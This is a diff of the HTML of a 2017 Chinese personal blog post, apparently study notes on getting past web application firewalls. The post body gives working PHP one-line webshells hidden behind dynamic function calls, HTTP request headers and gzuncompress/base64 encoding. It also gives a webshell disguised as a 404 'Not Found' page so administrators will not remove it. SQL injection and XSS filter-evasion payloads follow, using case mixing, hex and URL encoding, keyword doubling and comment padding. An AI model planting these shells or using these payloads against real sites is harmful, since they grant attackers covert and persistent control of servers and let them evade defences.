@@ -93,17 +93,17 @@
 
 
 
-<meta name="description" content="听学长说现在web很多都要花式bypass waf刚好才理解一点一句话木马 看到一篇升级版一句话即关于其无特征bupass waf的文章 先记录下来 （也看到了一篇sql和xss绕waf的 挺不错的 记录在下面） 姿势一 php动态函数 （无eval）&amp;lt;?php $_POST[&amp;#39;xx&amp;#39;]($_POST[&amp;#39;oo&amp;#39;]);?&amp;gt;利用 在hackbar Post">
+<meta name="description" content="一句话 bypass_waf听学长说现在web很多都要花式bypass waf刚好才理解一点一句话木马 看到一篇升级版一句话即关于其无特征bupass waf的文章 先记录下来 （也看到了一篇sql和xss绕waf的 挺不错的 记录在下面） 姿势一 php动态函数 （无eval）&amp;lt;?php $_POST[&amp;#39;xx&amp;#39;]($_POST[&amp;#39;oo&amp;#39;]);?&amp;gt;利用">
 <meta name="keywords" content="waf,xss,sql">
 <meta property="og:type" content="article">
 <meta property="og:title" content="bypass_waf">
 <meta property="og:url" content="http://Merl1ng.com/2017/07/20/bypass_waf/index.html">
 <meta property="og:site_name" content="Merl1ng">
-<meta property="og:description" content="听学长说现在web很多都要花式bypass waf刚好才理解一点一句话木马 看到一篇升级版一句话即关于其无特征bupass waf的文章 先记录下来 （也看到了一篇sql和xss绕waf的 挺不错的 记录在下面） 姿势一 php动态函数 （无eval）&amp;lt;?php $_POST[&amp;#39;xx&amp;#39;]($_POST[&amp;#39;oo&amp;#39;]);?&amp;gt;利用 在hackbar Post">
-<meta property="og:updated_time" content="2017-07-24T06:10:16.201Z">
+<meta property="og:description" content="一句话 bypass_waf听学长说现在web很多都要花式bypass waf刚好才理解一点一句话木马 看到一篇升级版一句话即关于其无特征bupass waf的文章 先记录下来 （也看到了一篇sql和xss绕waf的 挺不错的 记录在下面） 姿势一 php动态函数 （无eval）&amp;lt;?php $_POST[&amp;#39;xx&amp;#39;]($_POST[&amp;#39;oo&amp;#39;]);?&amp;gt;利用">
+<meta property="og:updated_time" content="2017-07-24T06:58:20.524Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="bypass_waf">
-<meta name="twitter:description" content="听学长说现在web很多都要花式bypass waf刚好才理解一点一句话木马 看到一篇升级版一句话即关于其无特征bupass waf的文章 先记录下来 （也看到了一篇sql和xss绕waf的 挺不错的 记录在下面） 姿势一 php动态函数 （无eval）&amp;lt;?php $_POST[&amp;#39;xx&amp;#39;]($_POST[&amp;#39;oo&amp;#39;]);?&amp;gt;利用 在hackbar Post">
+<meta name="twitter:description" content="一句话 bypass_waf听学长说现在web很多都要花式bypass waf刚好才理解一点一句话木马 看到一篇升级版一句话即关于其无特征bupass waf的文章 先记录下来 （也看到了一篇sql和xss绕waf的 挺不错的 记录在下面） 姿势一 php动态函数 （无eval）&amp;lt;?php $_POST[&amp;#39;xx&amp;#39;]($_POST[&amp;#39;oo&amp;#39;]);?&amp;gt;利用">
 
 
 
@@ -352,15 +352,14 @@
       
 
       
-        <p>听学长说现在web很多都要花式bypass waf<br>刚好才理解一点一句话木马 看到一篇升级版一句话<br>即关于其无特征bupass waf的文章 先记录下来</p>
+        <h3 id="一句话-bypass-waf"><a href="#一句话-bypass-waf" class="headerlink" title="一句话 bypass_waf"></a>一句话 bypass_waf</h3><p>听学长说现在web很多都要花式bypass waf<br>刚好才理解一点一句话木马 看到一篇升级版一句话<br>即关于其无特征bupass waf的文章 先记录下来</p>
 <p>（也看到了一篇sql和xss绕waf的 挺不错的 记录在下面）</p>
 <p>姿势一 php动态函数 （无eval）<br><code>&lt;?php $_POST[&#39;xx&#39;]($_POST[&#39;oo&#39;]);?&gt;</code><br>利用 在hackbar Post data<br>写入xx=assert￥oo=QAQ</p>
 <p>姿势二 无Post<br>getallheaders函数能够获取请求头内容<br><code>&lt;?php eval(getallheaders()[&#39;Accept-Language&#39;]);&gt;</code><br>结合姿势一<br><code>&lt;?php $a=getallheaders()[&#39;xxx&#39;];$a(getallheaders()[&#39;ooo&#39;]);&gt;</code></p>
 <p>姿势三 遇到会检测http请求头内容的waf<br><code>&lt;?php eval(gzuncompress(base64_decode(getallheaders()[&#39;xx&#39;])));&gt;</code><br>解开之后发现是乱码，waf识别不出来里面的内容<br>结合姿势一<br><code>&lt;?php $xx=gzuncompress(base64_decode(getallheaders()[&#39;xx&#39;]));$xx(gzuncompress(base64_decode(getallheaders()[&#39;oo&#39;])));&gt;</code></p>
 <p>姿势四 防止管理员删shell&gt;伪装成404</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">&lt;!DOCTYPE HTML PUBLIC <span class="string">"-//IETF//DTD HTML 2.0//EN"</span>&gt;</div><div class="line">&lt;html&gt;&lt;head&gt;</div><div class="line">&lt;title&gt;404 Not Found&lt;/title&gt;</div><div class="line">&lt;/head&gt;&lt;body&gt;</div><div class="line">&lt;h1&gt;Not Found&lt;/h1&gt;</div><div class="line">&lt;p&gt;The requested URL was not found on this server.&lt;/p&gt;</div><div class="line"> </div><div class="line">...</div><div class="line"> </div><div class="line">&lt;?php</div><div class="line"><span class="variable">$xx</span>=getallheaders()[<span class="string">'xx'</span>];</div><div class="line"><span class="variable">$oo</span>=getallheaders()[<span class="string">'oo'</span>];</div><div class="line"><span class="keyword">if</span>(<span class="variable">$xx</span>!=<span class="string">""</span> and <span class="variable">$oo</span>!=<span class="string">""</span>)&#123;</div><div class="line">  <span class="variable">$xx</span>=gzuncompress(base64_decode(<span class="variable">$xx</span>));<span class="variable">$xx</span>(gzuncompress(base64_decode(<span class="variable">$oo</span>)));</div><div class="line">&#125;</div><div class="line">&gt;</div><div class="line">&lt;/body&gt;&lt;/html&gt;</div></pre></td></tr></table></figure>
-<p>SQl XSS bypass waf</p>
-<p>姿势一 大小写转换<br>SQL：<code>sEleCt vERsIoN()</code><br>XSS：<code>&lt;sCrIpt&gt;aleRt(1)&lt;/scrIpt&gt;</code></p>
+<h3 id="SQl-XSS-bypass-waf"><a href="#SQl-XSS-bypass-waf" class="headerlink" title="SQl XSS bypass waf"></a>SQl XSS bypass waf</h3><p>姿势一 大小写转换<br>SQL：<code>sEleCt vERsIoN()</code><br>XSS：<code>&lt;sCrIpt&gt;aleRt(1)&lt;/scrIpt&gt;</code></p>
 <p>姿势二 字符编码<br>SQL：<code>load_file(0x633A2F77696E646F77732F6D792E696E69)</code><br>XSS：<code>&lt;script%20src%3D&quot;http%3A%2F%2F0300.0250.0000.0001&quot;&gt;&lt;%2Fscript&gt;</code></p>
 <p>姿势三 拼凑法 其只验证一次<br>SQL：<code>selselectect verversionsion();</code><br>XSS：<code>&lt;scr&lt;script&gt;rip&gt;alalertert&lt;/scr&lt;/script&gt;rip&gt;</code></p>
 <p>姿势四 干扰字符污染法：<br>空字符 空格 TAB换行 注释 特殊的函数等等都可以<br><code>SQL：sEleCt+1-1+vERsIoN   /*!*/       ();</code>yohehe‍‍<code>`‍‍SQL2：select/*!*/</code>version<code>()</code></p>
@@ -470,8 +469,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            Overview
+          </li>
+        </ul>
+      
 
-      <section class="site-overview sidebar-panel sidebar-panel-active">
+      <section class="site-overview sidebar-panel">
         <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
           <img class="site-author-image" itemprop="image"
                src="/images/avatar.gif"
@@ -553,6 +561,22 @@
 
       </section>
 
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#一句话-bypass-waf"><span class="nav-number">1.</span> <span class="nav-text">一句话 bypass_waf</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SQl-XSS-bypass-waf"><span class="nav-number">2.</span> <span class="nav-text">SQl XSS bypass waf</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
       
 
       
